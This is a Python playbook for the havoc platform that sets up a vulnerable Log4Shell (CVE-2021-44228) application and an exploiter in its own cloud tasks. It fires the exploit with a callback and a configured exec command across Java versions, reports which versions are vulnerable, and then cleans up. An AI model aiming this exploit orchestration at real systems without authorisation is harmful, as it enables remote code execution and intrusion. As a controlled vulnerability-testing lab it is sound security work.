# Import the supporting Python packages.
import re
import os
import json
import string
import random
import pprint
import time as t
import argparse
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - cve-2021-44228 testing')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/cve_2021_44228_testing/cve_2021_44228_testing.ini')

exploiter_http_port = config.get('cve_2021_44228_exploit_task', 'http_port')
exploiter_ldap_port = config.get('cve_2021_44228_exploit_task', 'ldap_port')
exploiter_domain_name = config.get('cve_2021_44228_exploit_task', 'domain_name')
exploiter_exec_cmd = config.get('cve_2021_44228_exploit_task', 'exec_cmd')
vulnerable_domain_name = config.get('cve_2021_44228_vulnerable_task', 'domain_name')
vulnerable_target_port = config.get('cve_2021_44228_vulnerable_task', 'http_port')

def get_task_attack_ip(tn):
    task_details = h.get_task(tn)
    task_attack_ip = task_details['attack_ip']
    return task_attack_ip


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


# Poll the task_details until the task's status 'idle'.
def get_task_status(tn):
    task_status = None
    task_details = None
    while task_status != 'idle':
        t.sleep(5)
        task_details = h.get_task(tn)
        task_status = task_details['task_status']
    print(f'\n{tn} is ready:')
    pp.pprint(task_details)
    return task_details


# A 'while loop' can be used to continually pull the results queue until the command results are returned.
def get_command_results(tn, ic, ii, print_output=True):
    results = []
    command_finished = None
    try:
        while not command_finished:
            command_results = h.get_task_results(tn)
            if 'queue' in command_results:
                for entry in command_results['queue']:
                    if entry['instruct_command'] == ic and entry['instruct_instance'] == ii:
                        command_finished = True
                        if print_output:
                            print(f'\n{tn} {ic} results:')
                            pp.pprint(entry)
                        results.append(entry)
            if not command_finished:
                t.sleep(5)
    except KeyboardInterrupt:
        print('get_command_results interrupted. Skipping results...')
    return results


class Exploit:
    def __init__(self):
        self.infrastructure = None
        self.vulnerable_task_name = None
        self.vulnerable_ip = None
        self.exploiter_task_name = None
        self.exploiter_task_host_name = None
        self.exploiter_ip = None
        self.exploiter_exists = None
        self.vulnerable_exists = None
        self.exploiter_portgroup_exists = None
        self.vulnerable_portgroup_exists = None
        self.cve_exists = None

    def clean_up(self, do_exit=None):
        if self.exploiter_exists:
            print(f'Killing exploiter task on {self.exploiter_exists}')
            instruct_instance = 'clean_up'
            instruct_command = 'terminate'
            h.instruct_task(self.exploiter_exists, instruct_instance, instruct_command)
            command_finished = None
            while not command_finished:
                kill_task_results = h.get_task_results(self.exploiter_exists)
                for entry in kill_task_results['queue']:
                    if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                        print('Task terminated.')
                        t.sleep(5)
                        command_finished = True
                if not command_finished:
                    t.sleep(5)

        if self.vulnerable_exists:
            print(f'Killing vulnerable task on {self.vulnerable_exists}')
            instruct_instance = 'clean_up'
            instruct_command = 'terminate'
            h.instruct_task(self.vulnerable_exists, instruct_instance, instruct_command)
            command_finished = None
            while not command_finished:
                kill_task_results = h.get_task_results(self.vulnerable_exists)
                for entry in kill_task_results['queue']:
                    if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                        print('Task terminated.')
                        t.sleep(5)
                        command_finished = True
                if not command_finished:
                    t.sleep(5)

        if self.exploiter_portgroup_exists:
            # Delete the exploiter portgroup.
            print(f'\nDeleting the {self.exploiter_portgroup_exists} portgroup.')
            h.delete_portgroup(self.exploiter_portgroup_exists)

        if self.vulnerable_portgroup_exists:
            # Delete the vulnerable portgroup.
            print(f'\nDeleting the {self.vulnerable_portgroup_exists} portgroup.')
            h.delete_portgroup(self.vulnerable_portgroup_exists)

        # All done.
        if do_exit:
            exit('\nDone... Exiting.\n')

    def build_infrastructure(self):
        # Create a portgroup for the vulnerable task's HTTP port.
        print(f'\nCreating a portgroup for the vulnerable task.')
        h.create_portgroup('vulnerable', f'Allows port {vulnerable_target_port} traffic')
        self.vulnerable_portgroup_exists = 'vulnerable'

        # Launch a vulnerable task.
        vulnerable_task_name = f'cve_2021_44228_vulnerable_{sdate}'
        portgroups = ['vulnerable']
        if vulnerable_domain_name == 'None':
            vulnerable_task_host_name = 'None'
        else:
            vulnerable_task_host_name = 'cve-2021-44228-vulnerable'
        print(f'\nLaunching cve_2021_44228_exploiter task with name {vulnerable_task_name}.')
        h.run_task(
            vulnerable_task_name,
            'trainman',
            task_host_name=vulnerable_task_host_name,
            task_domain_name=vulnerable_domain_name,
            portgroups=portgroups
        )
        self.vulnerable_exists = vulnerable_task_name

        # Wait for the vulnerable task to become ready.
        print(f'\nWaiting for vulnerable task {vulnerable_task_name} to become ready.')
        vulnerable_task_status = get_task_status(vulnerable_task_name)
        vulnerable_ip = vulnerable_task_status['attack_ip']
        print(f'\nThe vulnerable task is ready with the following parameters:')
        print(f'\nIP - {vulnerable_ip}')
        print(f'\nHost name - {vulnerable_task_host_name}')
        print(f'\nDomain name - {vulnerable_domain_name}')

        # Create a portgroup for the exploiter task's HTTP and LDAP ports.
        print(f'\nCreating a portgroup for the exploiter task.')
        h.create_portgroup('exploiter', f'Allows port {exploiter_http_port} and port {exploiter_ldap_port} traffic')
        print(f'\nAdding portgroup rule to allow {vulnerable_task_name} task target IP {vulnerable_ip} to reach '
              f'port {exploiter_http_port}.\n')
        h.update_portgroup_rule('exploiter', 'add', f'{vulnerable_ip}/32', exploiter_http_port, 'tcp')
        print(f'\nAdding portgroup rule to allow {vulnerable_task_name} task target IP {vulnerable_ip} to reach '
              f'port {exploiter_ldap_port}.\n')
        h.update_portgroup_rule('exploiter', 'add', f'{vulnerable_ip}/32', exploiter_ldap_port, 'tcp')
        self.exploiter_portgroup_exists = 'exploiter'

        # Launch an exploiter task.
        exploiter_task_name = f'cve_2021_44228_exploiter_{sdate}'
        portgroups = ['exploiter']
        if exploiter_domain_name == 'None':
            exploiter_task_host_name = 'None'
        else:
            exploiter_task_host_name = 'cve-2021-44228-exploiter'
        print(f'\nLaunching cve_2021_44228_exploiter task with name {exploiter_task_name}.')
        h.run_task(
            exploiter_task_name,
            'trainman',
            task_host_name=exploiter_task_host_name,
            task_domain_name=exploiter_domain_name,
            portgroups=portgroups
        )
        self.exploiter_exists = exploiter_task_name

        # Wait for the exploiter task to become ready.
        print(f'\nWaiting for exploiter task {exploiter_task_name} to become ready.')
        exploiter_task_status = get_task_status(exploiter_task_name)
        exploiter_ip = exploiter_task_status['attack_ip']
        print(f'\nThe exploiter task is ready with the following parameters:')
        print(f'\nIP - {exploiter_ip}')
        print(f'\nHost name - {exploiter_task_host_name}')
        print(f'\nDomain name - {exploiter_domain_name}')

        # Add a portgroup rule to allow exploiter to reach the vulnerable task.
        print(f'\nAdding portgroup rule to allow {exploiter_task_name} task attack IP {exploiter_ip} to reach '
              f'{vulnerable_task_name} task target IP {vulnerable_ip} on port {vulnerable_target_port}.\n')
        h.update_portgroup_rule('vulnerable', 'add', f'{exploiter_ip}/32', vulnerable_target_port, 'tcp')

        build_results = {
            'vulnerable_task_name': vulnerable_task_name,
            'vulnerable_ip': vulnerable_ip,
            'exploiter_task_name': exploiter_task_name,
            'exploiter_task_host_name': exploiter_task_host_name,
            'exploiter_ip': exploiter_ip
        }
        return build_results

    def refresh_infrastructure(self):
        self.infrastructure = self.build_infrastructure()
        self.vulnerable_task_name = self.infrastructure['vulnerable_task_name']
        self.vulnerable_ip = self.infrastructure['vulnerable_ip']
        self.exploiter_task_name = self.infrastructure['exploiter_task_name']
        self.exploiter_task_host_name = self.infrastructure['exploiter_task_host_name']
        self.exploiter_ip = self.infrastructure['exploiter_ip']

    def run_exploit_test(self):
        if not self.infrastructure:
            self.refresh_infrastructure()

        # Use a random string for the cve_2021_44228_app task instruct_instance.
        jv_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

        # Get available java versions to use with vulnerable cve_2021_44228_app.
        print(
            f'\nGetting available Java versions for cve-2021-44228 vulnerable application on '
            f'{self.vulnerable_task_name}.'
        )
        instruct_command = 'list_java_versions'
        h.instruct_task(self.vulnerable_task_name, jv_instance, instruct_command)

        # Get the list_java_versions command results.
        java_versions = None
        list_java_versions_results = get_command_results(self.vulnerable_task_name, instruct_command, jv_instance)
        for ljr in list_java_versions_results:
            if ljr['instruct_command'] == instruct_command and ljr['instruct_instance'] == jv_instance:
                instruct_command_output = json.loads(ljr['instruct_command_output'])
                if instruct_command_output['outcome'] == 'success':
                    print('\nJava versions retrieved.\n')
                    java_versions = instruct_command_output['java_versions']
                else:
                    print('\nlist_java_versions failed... Exiting.\n')
                    self.clean_up(do_exit=True)

        # Cycle through Java versions list and test exploit
        tested_java_versions = {}
        for jv in java_versions:
            if not self.infrastructure:
                self.refresh_infrastructure()
            # Use a random string for the cve_2021_44228_app task instruct_instance.
            cve_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

            # Ask the cve_2021_44228_app task to start a vulnerable app.
            print(f'\nStarting cve-2021-44228 vulnerable app on {self.vulnerable_task_name} with Java version {jv}.')
            instruct_args = {'listen_port': vulnerable_target_port, 'java_version': jv}
            instruct_command = 'start_cve_2021_44228_app'
            h.instruct_task(self.vulnerable_task_name, cve_instance, instruct_command, instruct_args)

            # Get the start_cve_2021_44228_app command results.
            start_cve_results = get_command_results(self.vulnerable_task_name, instruct_command, cve_instance)
            for cvr in start_cve_results:
                if cvr['instruct_command'] == instruct_command and cvr['instruct_instance'] == cve_instance:
                    instruct_command_output = json.loads(cvr['instruct_command_output'])
                    if instruct_command_output['outcome'] == 'success':
                        print(f'\nstart_cve_2021_44228_app with Java version {jv} succeeded.\n')
                        self.cve_exists = [self.vulnerable_task_name, cve_instance]
                        tested_java_versions[jv] = 'tested'
                    else:
                        print(f'\nstart_cve_2021_44228_app with Java version {jv} failed.')
                        print(instruct_command_output['message'])
                        print(f'\nSkipping to next Java version.\n')

            # If cve_2021_44228_app started, ask the exploiter task to execute the exploit against the target IP.
            if self.cve_exists:
                print(f'\nInstructing exploiter task {self.exploiter_task_name} to execute exploit.')
                if self.exploiter_task_host_name == 'None':
                    callback = self.exploiter_ip
                else:
                    callback = f'{self.exploiter_task_host_name}.{exploiter_domain_name}'
                new_exec_cmd = re.sub('\$JAVA_VERSION', jv, exploiter_exec_cmd)
                target_url = f'http://{self.vulnerable_ip}:{vulnerable_target_port}'
                instruct_args = {
                    'callback': callback,
                    'target_url': target_url,
                    'http_port': exploiter_http_port,
                    'ldap_port': exploiter_ldap_port,
                    'exec_cmd': new_exec_cmd
                }
                instruct_command = 'exploit_cve_2021_44228'
                h.instruct_task(self.exploiter_task_name, cve_instance, instruct_command, instruct_args)

                # Get the exploit_cve_2021_44228 command results.
                exploit_results = get_command_results(self.exploiter_task_name, instruct_command, cve_instance)
                for ex_result in exploit_results:
                    if ex_result['instruct_command'] == instruct_command and \
                            ex_result['instruct_instance'] == cve_instance:
                        instruct_command_output = json.loads(ex_result['instruct_command_output'])
                        if instruct_command_output['outcome'] == 'success':
                            print(f'\nexploit_cve_2021_44228 on Java version {jv} succeeded.\n')
                            tested_java_versions[jv] = 'vulnerable'
                            self.infrastructure = None
                        else:
                            print(f'\nexploit_cve_2021_44228 on Java version {jv} failed.\n')

                # If successful exploit, clean_up, else ask the cve_2021_44228_app task to stop the vulnerable app.
                if not self.infrastructure:
                    self.clean_up()
                else:
                    print(
                        f'\nStopping cve-2021-44228 vulnerable application on '
                        f'{self.vulnerable_task_name} with Java version {jv}.'
                    )
                    instruct_command = 'stop_cve_2021_44228_app'
                    h.instruct_task(self.vulnerable_task_name, cve_instance, instruct_command)
                    self.cve_exists = False

                    # Get the stop_cve_2021_44228_app command results.
                    stop_cve_results = get_command_results(self.vulnerable_task_name, instruct_command, cve_instance)
                    for cv_result in stop_cve_results:
                        if cv_result['instruct_command'] == instruct_command and \
                                cv_result['instruct_instance'] == cve_instance:
                            instruct_command_output = json.loads(cv_result['instruct_command_output'])
                            if instruct_command_output['outcome'] == 'success':
                                print(f'\nstop_cve_2021_44228_app with Java version {jv} succeeded.\n')
                            else:
                                print(f'\nstop_cve_2021_44228_app with Java version {jv} failed... Exiting.\n')
                                self.clean_up(do_exit=True)

        print('All available Java versions tested. Cleaning up...')
        if self.infrastructure:
            self.clean_up()
        return tested_java_versions


# Start the exploit test.
e = Exploit()
java_test_results = e.run_exploit_test()

# Print vulnerable Java versions.
if java_test_results:
    print('\nTested Java versions:')
    for k,v in java_test_results.items():
        print(f'\nJava version: {k}, Status: {v}')

# Playbook is complete.
exit('\nPlaybook operation completed.')
